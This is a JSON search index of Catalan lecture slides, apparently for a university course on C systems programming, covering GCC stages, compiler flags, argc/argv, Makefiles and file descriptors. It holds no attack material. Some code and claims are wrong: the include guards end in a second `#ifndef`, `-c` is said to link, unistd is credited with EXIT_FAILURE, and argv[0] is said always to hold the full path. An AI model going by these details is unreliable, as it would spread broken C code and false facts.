    "objectID": "slides/01-c.html#desenvolupament-en-sistemes-linuxunix",
    "href": "slides/01-c.html#desenvolupament-en-sistemes-linuxunix",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Desenvolupament en sistemes Linux/UNIX",
    "text": "Desenvolupament en sistemes Linux/UNIX\nEl desenvolupament de programari de sistema el realitzarem amb els llenguatge C i basa en els compiladors GNU gcc.\n#!/bin/sh\n# ./check.sh\ngcc -v\nif [ $? != 0 ]; then\n       echo \"GCC is not installed!\"\nfi\nld -v\nif [ $? != 0 ]; then\n        echo \"Please install binutils!\"\nfi\n\nFitxer: scripts/check.sh\n\n\nPer poder desenvolupar en C en un sistema Linux/UNIX necessitem tenir instal·lat el compilador GCC i les eines de binutils. Aquestes eines són necessàries per a la compilació i enllaçat dels programes. Per comprovar si tenim instal·lat aquestes eines podem executar el script anterior. Si no tenim instal·lat aquestes eines, podem instal·lar-les amb la comanda sudo apt-get install build-essential en sistemes basats en Debian o sudo dnf groupinstall \"Development Tools\" en sistemes basats en RedHat.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#navegant-a-les-entranyes-del-compilador-gcc",
    "href": "slides/01-c.html#navegant-a-les-entranyes-del-compilador-gcc",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Navegant a les entranyes del compilador GCC",
    "text": "Navegant a les entranyes del compilador GCC\n\n\n\n\n\n\n\nEls llenguatges de programació compilats són aquells que es tradueixen a codi màquina abans de l’execució. Aquest procés de traducció es realitza per un programa anomenat compilador. El compilador és un programa que tradueix el codi font d’un programa escrit en un llenguatge de programació de nivell alt a codi màquina. En el cas de C, hi ha diferents etapes codi, ensamblador i enllaçador. El compilador GCC és un compilador de codi obert que es pot utilitzar per a la compilació de programes en C, C++, Fortran, Ada, etc. Aquest compilador és molt potent i permet la compilació de programes en diferents plataformes. A més, el compilador GCC és molt flexible i permet la configuració de diferents opcions de compilació.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#etapes-de-la-compilació-i-lenllaç-i",
    "href": "slides/01-c.html#etapes-de-la-compilació-i-lenllaç-i",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Etapes de la compilació i l’enllaç (I)",
    "text": "Etapes de la compilació i l’enllaç (I)\nPreprocessador\n\nEl preprocessador processa el codi font, buscant instruccions que comencen amb un hash (#), com #include, #define, i #ifdef.\nInclou fitxers d’encapçalament (headers) i substitueix macros i definicions. També elimina els comentaris.\nGenera un fitxer de codi font amb les instruccions del preprocessador processades, preparat per a la compilació.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#etapes-de-la-compilació-i-lenllaç-ii",
    "href": "slides/01-c.html#etapes-de-la-compilació-i-lenllaç-ii",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Etapes de la compilació i l’enllaç (II)",
    "text": "Etapes de la compilació i l’enllaç (II)\nCompilador\n\nTraduïx el codi font al assemblador equivalent. En alguns compiladors, el codi es pot convertir directament en codi màquina en aquesta etapa.\nTraduir el codi de nivell alt a codi de nivell baix i optimitzar-lo per al maquinari subjacent.\nGenera un fitxer de codi assemblador amb l’extensió .s. Per exemple, si el fitxer de codi font és hola.c, el fitxer generat seria hola.s.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#etapes-de-la-compilació-i-lenllaç-iii",
    "href": "slides/01-c.html#etapes-de-la-compilació-i-lenllaç-iii",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Etapes de la compilació i l’enllaç (III)",
    "text": "Etapes de la compilació i l’enllaç (III)\nAssemblador\n\nConverteix el codi assemblador en codi objecte o codi de màquina.\nProduir codi binari que pugui ser entès per la CPU.\nGenera un fitxer de codi objecte amb l’extensió .o. Per exemple, el fitxer resultant seria hola.o.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#etapes-de-la-compilació-i-lenllaç-iv",
    "href": "slides/01-c.html#etapes-de-la-compilació-i-lenllaç-iv",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Etapes de la compilació i l’enllaç (IV)",
    "text": "Etapes de la compilació i l’enllaç (IV)\nEnllaçador (Linker)\n\nEnllaça el codi objecte amb les biblioteques necessàries per crear l’executable final.\nOrganitzar i combinar el codi objecte i les biblioteques, resolent les referències externes.\nGenera l’executable final, que és el fitxer que podeu executar. Per exemple, hola.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#exemple-etapes",
    "href": "slides/01-c.html#exemple-etapes",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Exemple: Etapes",
    "text": "Exemple: Etapes\n\n\n#include &lt;stdio.h&gt;\n\n#define x 10\n#define y 5\n\nint \nmain(){\n  printf(\"El resultat de l'opearció: \n      %d + %d = %d\\n\", x,y,x+y);\n    return 0;\n}\n\nFitxer: sources/ex1.c\n\n\n\nExecutable: gcc -o ex1 ex1.c\nAssemblador: gcc -S -o ex1.s ex1.c\nCodi objecte: gcc -c -o ex1.o ex1.c\nPreprocessador: gcc -E -o ex1.i ex1.c\nDesensamblador: objdump -d ex1.o o objdump -d -M intel ex1\n\n\n\n\n\n\n\n\n\nNotes\n\n\n\n-M intel indica l’ús de la sintaxi Intel per a una millor llegibilitat.\nTots aquests fitxers generats els posarem al .gitignore.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#com-funciona-el-compilador-gcc",
    "href": "slides/01-c.html#com-funciona-el-compilador-gcc",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Com funciona el compilador GCC?",
    "text": "Com funciona el compilador GCC?\ngcc &lt;codi&gt; -g -c &lt;codi&gt; -o &lt;executable&gt; -I &lt;dirIncludes&gt; -L &lt;dirLibs&gt;\n\n-g: Genera informació de depuració.\n-c: Enllaça només el fitxer especificat.\n-o: Fitxer executable de sortida (per defecte a a.out).\n-I: Directoris on es cercaran els fitxers .h.\n-L: Directoris on es cercaran les biblioteques.\n-l: Biblioteques a enllaçar.\n-Wall: Mostra tots els missatges d’advertència.\n-Werror: Converteix els missatges d’advertència en errors.\n-Wextra: Mostra missatges d’advertència addicionals.\n…: Altres opcions.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#el-nostre-primer-programa-hola-món",
    "href": "slides/01-c.html#el-nostre-primer-programa-hola-món",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "El nostre primer programa: Hola món",
    "text": "El nostre primer programa: Hola món\n\n\n\nPreprocessador: El fitxer stdio proporciona la definició de la funció printf.\nmain(): Funció principal i obligatòria. Aquesta no rep cap argument i retorna un enter.\nLa funció printf rep un argument del tipus char *.\nreturn 0: Indica que tot ha anat bé i acaba la funció main().\n\n\n#include &lt;stdio.h&gt;\n/* This is a comment */\nint main()\n{\n    printf(\"Hola món!\\n\");\n    return 0;\n}\n\n# Compilem hola.c\ngcc -o hola hola.c \n# Executem hola\n./hola \n\n\nLa funció printf es troba a la biblioteca estàndard de C, podem consultar man s3 printf per obtenir més informació. Aquesta funció permet mostrar text per pantalla. Els arguments que rep són una cadena de caràcters i els valors que volem mostrar. Els valors es substitueixen a la cadena de caràcters mitjançant el format %d per a enters, %f per a nombres en punt flotant, %c per a caràcters i %s per a cadenes de caràcters. Els caràcters \\n indiquen un salt de línia.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#el-nostre-primer-programa-amb-llibreries-externes",
    "href": "slides/01-c.html#el-nostre-primer-programa-amb-llibreries-externes",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "El nostre primer programa amb llibreries externes",
    "text": "El nostre primer programa amb llibreries externes\n#include &lt;math.h&gt;\n#include &lt;stdio.h&gt;\nint main (void)\n{\n  double x = 2.0;\n  double y = sqrt (x);\n  printf (\"La rai­z cuadrada de %f es %f\\n\", x, y);\n  return 0;\n}\n\nFitxer: sources/arrel.c\n\n// Complilació amb ruta global a la llibreria\ngcc -Wall SO_usingLibraries.c /usr/lib/x86_64-linux-gnu/libm.a -o calc\n// Compilació utilitzant la forma abreujada\ngcc -Wall SO_usingLibraries.c -lm -o calc\n\nPer obtenir informació sobre la funció sqrt podeu consultar la pàgina de manual amb la comanda man -s3 sqrt. Aquesta funció es troba a la biblioteca matemàtica, per això cal enllaçar-la amb el programa. Per això s’utilitza l’opció -lm. Quan compilem un programa en C, el compilador pot incorporar certes funcions de la biblioteca estàndard de forma automàtica perquè són part de les especificacions del llenguatge (com printf, scanf, etc.). No obstant això, altres funcions, com les de la biblioteca matemàtica, no es troben dins d’aquest conjunt i, per tant, cal especificar manualment que volem enllaçar-les amb el programa.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#activitat-calculadora-i",
    "href": "slides/01-c.html#activitat-calculadora-i",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Activitat: Calculadora (I)",
    "text": "Activitat: Calculadora (I)\n\n\n// calc.h\n#ifndef CALC_H\n#define CALC_H\n\ndouble suma(\n  double a, \n  double b);\n\n#ifndef CALC_H\n\n// calc.c\n#include \"calc.h\"\n\ndouble suma(\n  double a, \n  double b) \n  {\n    return a + b;\n  }\n\n#include &lt;stdio.h&gt;\n#include \"calc.h\"\n\nint main() {\n  double a = 2.0;\n  double b = 3.0;\n  suma(a, b);\n  return 0;\n}\n\n\ngcc -c calc.c -o calc.o\ngcc -c main.c -o main.o\ngcc calc.o main.o -o calc\n./calc",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#activitat-calculadora-ii",
    "href": "slides/01-c.html#activitat-calculadora-ii",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Activitat: Calculadora (II)",
    "text": "Activitat: Calculadora (II)\n\n\n// calc.h\n#ifndef CALC_H\n#define CALC_H\n\ndouble potencia(\n  double a, \n  double b);\n\n#ifndef CALC_H\n\n// calc.c\n#include \"calc.h\"\n#include &lt;math.h&gt;\ndouble potencia(\n  double a, \n  double b) \n  {\n    return pow(a, b);\n  }\n\n#include &lt;stdio.h&gt;\n#include \"calc.h\"\n\nint main() {\n  double a = 2.0;\n  double b = 3.0;\n  potencia(a, b);\n  return 0;\n}\n\n\ngcc -c calc.c -o calc.o\ngcc -c main.c -o main.o\ngcc calc.o main.o -o calc -lm\n./calc",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#els-arguments-dentrada",
    "href": "slides/01-c.html#els-arguments-dentrada",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Els arguments d’entrada",
    "text": "Els arguments d’entrada\nLa funció main() té dos arguments que tradicionalment s’anomenen argc (Longitud del vector d’argument) i argv (Matriu de punters de caràcters).\n\n\nRetorna un enter\n\n0: En cas d’èxit.\n-1 (negatiu): en cas de fallada.\n\n\nint \nmain(int argc, \n     char *argv[]) \n{...}\n\n./a.out -o foo -vv\nargv = [ \"/path/to/a.out\", \n  \"-o\" \"foo\", \"-vv\" ];\n\n\nArgv és una representació tokenitzada.\nArgv[0] mai està buit i sempre conté la ruta completa a l’executable.\n\n\nCom ja hem vist la funció main() és la primera funció del vostre programa que s’executa quan comença a executar-se. Aquesta funció crida a **_start()**, que normalment proporciona la biblioteca de temps d’execució C, enllaçat automàticament quan es compila el programa.\nLa funció main() té dos arguments que tradicionalment s’anomenen argc (Longitud del vector d’argument) i argv (Matriu de punters de caràcters) i retorna un nombre enter amb signe. La majoria dels entorns Unix esperen que els programes tornin 0 (zero) en cas d’èxit i -1 (negatiu) en cas de fallada.\nArgv és una representació tokenitzada de la línia d’ordres que va invocar el vostre programa. Argv[0] mai està buit i sempre conté la ruta completa a l’executable.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#exemple-check_args.c",
    "href": "slides/01-c.html#exemple-check_args.c",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Exemple: check_args.c",
    "text": "Exemple: check_args.c\n\n\n#include &lt;stdio.h&gt;\n\nint\nmain(int argc, char **argv) {\n\n  int i;\n\n  for (i=0; i&lt;argc; i++) {\n    printf(\"%s\\n\", argv[i]);\n  }\n\n  return 0;\n}\n\ngcc check_args.c -o check_args\n./check_args a.out\n./check_args *.c\n./check_args $USER $PWD $SHELL\n\n\nAquest programa ens permet observa com es capturen els arguments.\nAra executarem aquest programa amb els diferents tipus de shell que tenim instal·lades.\nPer modificar la shell: chsh -s /bin/sh jordi.\n\n\n\nFitxer: sources/check_args.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#include",
    "href": "slides/01-c.html#include",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Include",
    "text": "Include\nEn el llenguatge de programació C, la directiva #include diu al preprocessador que insereixi el contingut d’un altre fitxer al codi font en el punt on es trobi la directiva #include.\n\n#include &lt;header_file&gt;: El preprocessador cercarà una ruta de directori predeterminada per localitzar el fitxer de capçalera. Normalment, els fitxers són: /usr/include.\n#include \"header_file\": El preprocessador buscarà el fitxer de capçalera al mateix directori que el fitxer font",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#include-header-més-improtants",
    "href": "slides/01-c.html#include-header-més-improtants",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Include: Header més improtants",
    "text": "Include: Header més improtants\n\n\n\n\n\n\n\nHeader\nFuncionalitat\n\n\n\n\nstdio\nSubministra entrada i sortida: funcions FILE, stdin, stdout, stderr i fprint().\n\n\nstdlib\nSubministra funcions d’utilitat: malloc(), calloc() i realloc().\n\n\nunistd\nSubministraments EXIT_FAILURE, EXIT_SUCCESS.\n\n\nerrno\nDefineix la variable errno externa i tots els valors que pot prendre.\n\n\nassert\nSubministra funcions de diagnòstic.\n\n\ntime\nSubministraments Funcions de data i hora.\n\n\nmath\nProporciona funcions de suport matemàtiques.\n\n\nstring\nProporciona funcions memcpy(), memset() i strlen().\n\n\ngetopt\nProporciona optarg, opterr i getopt() externs.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#define",
    "href": "slides/01-c.html#define",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Define",
    "text": "Define\nLa directiva #define permet la definició de macros dins del codi font. Aquestes definicions de macro permeten declarar valors constants per utilitzar-los en tot el codi. Les definicions de macro no són variables i el programa no les pot canviar. Utilitzeu aquesta sintaxi quan creeu constants que representen nombres, cadenes o expressions.\n\n\n#definir el valor CNAME\n#definir CNAME (expressió)\n\n#define DEFAULT_PROGNAME \"myProgName\"\n#define BUFSIZE 4096\n\n\nL’expressió s’ha d’entregar entre parèntesis si conté operadors.\nNO poseu ; al final de les sentències #define.\nQuan s’anomena un #define per distingir-lo dels noms de variables i funcions, utilitzeu majúscules.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#external-declarations",
    "href": "slides/01-c.html#external-declarations",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "External declarations",
    "text": "External declarations\nUna declaració externa porta aquest nom a l’espai de noms de la unitat de compilació actual (també conegut com fitxer) i permet al programa accedir a aquesta variable. La paraula clau extern amplia la visibilitat de la funció a tot el programa, la funció es pot utilitzar (anomenar) a qualsevol lloc de qualsevol dels fitxers de tot el programa, sempre que aquests fitxers continguin una declaració de la funció.\nextern int errno;\n// errno s'utilitza com a canal de comunicació per la  biblioteca \n// C estàndard per comunicar el motiu de fallada d'una funció determinada.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#llibreria-errno",
    "href": "slides/01-c.html#llibreria-errno",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Llibreria errno",
    "text": "Llibreria errno\nLa variable global errno és defineix a la biblioteca errno.h.\n\nAquest valor de variable només és rellevant quan la trucada retorna un error (normalment el codi -1).\nPer més informació: $ man errno\nEs pot veure un missatge d’error descriptiu identificat per errno utilitzant la funció perror de la biblioteca &lt;stdio.h&gt;. Funció: void perror(const char*); Aquesta funció primer mostra el missatge i després l’error. #include &lt;stdio.h&gt;.\n\n\nFitxer: sources/errno_example.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#activitat-echo-amb-c",
    "href": "slides/01-c.html#activitat-echo-amb-c",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Activitat: echo amb c",
    "text": "Activitat: echo amb c\n\n#include &lt;stdio.h&gt;\n\nint main(int argc, char *argv[]) {\n  int i;\n  if (argc &lt; 2) {\n    fprintf(stderr, \"Usage: %s &lt;string&gt;\\n\", argv[0]);\n    return -1;\n  }\n  for (i = 1; i &lt; argc; i++) {\n    printf(\"%s \", argv[i]);\n  }\n  printf(\"\\n\");\n  return 0;\n}\n\nFitxer: sources/echo.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#activitat-cd-amb-c",
    "href": "slides/01-c.html#activitat-cd-amb-c",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Activitat: cd amb c",
    "text": "Activitat: cd amb c\n#include &lt;stdio.h&gt;  // Per fprintf() i perror()\n#include &lt;unistd.h&gt; // Per chdir()\n\nint main(int argc, char *argv[]) {\n    if (argc &lt; 2) {\n        fprintf(stderr, \"Usage: %s &lt;directory&gt;\\n\", argv[0]);\n        return 1;\n    }\n    if (chdir(argv[1]) == -1) {\n        perror(\"chdir\");\n        return 1;  \n    }\n    return 0;  \n}\n\nFitxer: sources/cd.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#què-és-un-makefile",
    "href": "slides/01-c.html#què-és-un-makefile",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Què és un Makefile?",
    "text": "Què és un Makefile?\nUn fitxer Makefile és un fitxer de text que conté un conjunt de regles utilitzades per construir un programa. Aquestes regles indiquen al sistema com compilar i enllaçar el programa.\n\nAutomatització: Simplifica el procés de compilació i enllaçat.\nEficiència: Només es compilen els fitxers modificats, no tot el projecte.\nOrganització: Organitza el codi i les dependències de manera estructurada.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#organització-del-makefile",
    "href": "slides/01-c.html#organització-del-makefile",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Organització del Makefile",
    "text": "Organització del Makefile\ntarget: dependencies\n    command\n\ntarget: Nom de l’objectiu (executable o fitxer objecte).\ndependencies: Fitxers necessaris per a generar l’objectiu.\ncommand: Comandaments per a compilar o generar l’objectiu.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#plantilla-per-compilar-un-programa",
    "href": "slides/01-c.html#plantilla-per-compilar-un-programa",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Plantilla per compilar un programa",
    "text": "Plantilla per compilar un programa\nCC = gcc\nCFLAGS = -Wall -O2\nTARGET = programa\n\nall: $(TARGET)\n\n$(TARGET): programa.c\n    $(CC) $(CFLAGS) -o $(TARGET) programa.c\n\nclean:\n    rm -f $(TARGET)\n\nLa opció -O2 és un nivell d’optimització per al compilador. Indica al compilador que optimitzi el codi generat per a un millor rendiment. Inclou un conjunt d’optimitzacions per millorar la velocitat i la grandària del codi. Tenim diferents nivells d’optimització, per exemple -O0, -O1, -O2, -O3, -Os, -Og, -Ofast.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#com-gestiona-lentrada-i-sortida-el-so",
    "href": "slides/01-c.html#com-gestiona-lentrada-i-sortida-el-so",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Com gestiona l’entrada i sortida el SO?",
    "text": "Com gestiona l’entrada i sortida el SO?\nUns dels objectius del SO és proporcionar una màquina virtual que uniformitzi la complexitat dels dispositius d’E/S, necessitem independitzar les operacions i els dispositius.\n\nDispositius reals: Existeix en el món real. Combinació de diferents elements harwdare i software.\nDispositius físics: Formats pel perifèric i pel seu hardware de control i el programari que el gestiona (drivers).\nDispositius lògics: El resultat d’un programari del sistema que crea aquest dispositiu.\n\nNull: Dispositiu d’E/S sobre el qual podem escriure tot el que vulguem i sempre és buit.\nFinestra: Dispositiu lògic d’E/S que combina 4 dispositius físics: pantalla, teclat, memòria i un apuntador (ratolí).\n\n\n\nL’espai lògic és una agrupació d’informació emmagatzemada a la memòria física utilitzant la memòria virtual. Per tant, l’espai lògic d´’un procés es pot veure com un dispositiu entrada/sortida. Us podeu imaginar aquest espai lògic com un fitxer.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#esquema-de-dispositius",
    "href": "slides/01-c.html#esquema-de-dispositius",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Esquema de dispositius",
    "text": "Esquema de dispositius",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#dispositius-virtuals",
    "href": "slides/01-c.html#dispositius-virtuals",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Dispositius virtuals",
    "text": "Dispositius virtuals\nUn dispositiu virtual és un dispositiu que a priori no està associat a cap dispositiu real. En temps d’execució el sistema operatiu associarà el dispositiu virtual amb el dispositiu real.\n\nAssociació implícita: El sistema i el procés que ha iniciat l’execució són els encarregats de fer l’associació. Els dispositius virtuals associats de manera implícita són els dispositius estàndard, en el cas d’Unix tenim entrada estàndard (stdin), sortida estàndard(stdout) i sortida estàndard d’errors (stderr).\nAssociació explícita: Aquesta associació es dona entre un dispositiu virtual i un dispositiu real pel mateix programa durant l’execució. Per efectuar-la el programa necessita realitzar una operació específica que donat un dispositiu real generi un dispositiu virtual associat. A partir d’aquest moment el programa realitzarà les operacions d’E/S del dispositiu mitjançant el dispositiu virtual.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#operacions-es",
    "href": "slides/01-c.html#operacions-es",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Operacions E/S",
    "text": "Operacions E/S\nEl processos utilitzen els descriptors de fitxers per accedir als dispositius un cop ja han estat oberts per llegir i escriure informació.\n\n\nOperacions\n\nllegir(dispositiu,buffer de lectura,posició)\nescriure(dispositiu,buffer escriptura,posició)\nobrir(dispositiu, operació)\ntancar(dispositiu)\nposicionar(dispositiu, posició)\n\n\nDescriptors\n\n0: Entrada estàndard (stdin)\n1: Sortida estàndard(stdout)\n2: Sortida estàndard d’errors (stderr)\n\n\n\nFixeu-vos que el fet d’utilitzar dispositius virtuals no soluciona el problema de la independència si el sistema operatiu únicament utilitza els dispositius virtuals i aquests han de conèixer les peculiaritats dels dispositius reals per poder operar-hi. Per tant, necessitem una nova capa per damunt dels drivers que uniformitzi les operacions.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#descriptors-de-fitxer",
    "href": "slides/01-c.html#descriptors-de-fitxer",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Descriptors de fitxer",
    "text": "Descriptors de fitxer",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#fitxers",
    "href": "slides/01-c.html#fitxers",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Fitxers",
    "text": "Fitxers\n\n\n\nUn fitxer és una seqüència contigua de bytes.\nEl sistema operatiu no imposa cap format específic.\nCada byte es pot adreçar individualment.\nUn descriptor de fitxer és un nombre enter positiu específic que identifica els seus fixers oberts.\nTots els fitxers oberts per una aplicació es tanquen automàticament quan el procés acaba.\n\n\n\n\n\nValor\nSignificat\nDefecte\n\n\n\n\n0\nstdin (teclat)\nSI\n\n\n1\nstdout (pantalla)\nSI\n\n\n2\nstderr (pantalla)\nSI\n\n\n\\(3...N\\)\ndisponibles pels usuaris\nNO\n\n\n\n\nopen() : obre fitxers per llegir i/o escriure o per crear-los.\ncreat() : crea un fitxer buit.\nread() : llegeix informació d’un fitxer.\nwrite() : escriu informació en un fitxer.\nlseek() : aneu a un byte específic del fitxer.\nunlink() : elimina un fitxer.\nfcntl() : controla els atributs d’un fitxer.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#obrint-fitxers",
    "href": "slides/01-c.html#obrint-fitxers",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Obrint fitxers",
    "text": "Obrint fitxers\nPer crear o obrir un fitxer fem anar les crides a sistema open() i creat(). Aquestes retornen la seva descripció, o retornen -1 si hi ha hagut algun error.\n\n\n#include &lt; sys/types.h&gt; \n#include &lt; sys/stat.h&gt; \n#include &lt; fcntl.h&gt; \n\nint open ( const char *path, \n  int flags [, mode_t mode ]);\nint creat (const char *path, \n  mode_t mode);\n\n\npath: cadena amb el camí relatiu o absolut al fitxer.\nflags: mètode d’obertura de fitxer:\n\nO_RDONLY - només lectura.\nO_WRONLY - només escriptura.\nO_RDWR - lectura i escriptura.\nO_CREAT - crea el fitxer si no existeix.\nO_TRUNC - si existeix, l’obre i es trunca a 0 bytes.\nO_APPEND - escriu al final del fitxer.\n\nmode: especifica els permisos si es crea un fitxer nou (0644: -rw-r–r–)\n\n\n\nPodeu consultar la pàgina de manual de les crides a sistema per obtenir més informació:\n\nman -s2 fcntl\nman -s2 stat\nman -s2 open\nman creat",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#tancant-fitxers",
    "href": "slides/01-c.html#tancant-fitxers",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Tancant fitxers",
    "text": "Tancant fitxers\nPer tancar un fitxer utilitzarem close(). Aquesta crida a sistema desassocia el fitxer del procés. Retorna 0 si tot funciona correctament, en ca d’error -1.\n#include &lt;unistd.h&gt; \nint close(int fd);\n\nfd: Descriptor de fitxer que volem tancar.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#descriptors-de-fitxers-i",
    "href": "slides/01-c.html#descriptors-de-fitxers-i",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Descriptors de fitxers (I)",
    "text": "Descriptors de fitxers (I)\nint main() {\n \n int fd1, fd2, fd3;\n FILE *f;\n printf(\"STDIN_FILENO: %d\\n\", STDIN_FILENO); \n printf(\"stdout: %d\\n\", fileno(stdout)); \n printf(\"STDERR_FILENO: %d\\n\", STDERR_FILENO);\n\n printf(\"\\nOpening /dev/zero...\\n\");\n if ((fd1 = open(\"/dev/zero\", O_RDONLY)) &lt; 0) {\n  fprintf(stderr, \"Unable to open /dev/zero: %s\\n\", strerror(errno));\n } else {\n  printf(\"fd1: %d\\n\", fd1);\n }\n\nFitxer: sources/descriptors.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#descriptors-de-fitxers-ii",
    "href": "slides/01-c.html#descriptors-de-fitxers-ii",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Descriptors de fitxers (II)",
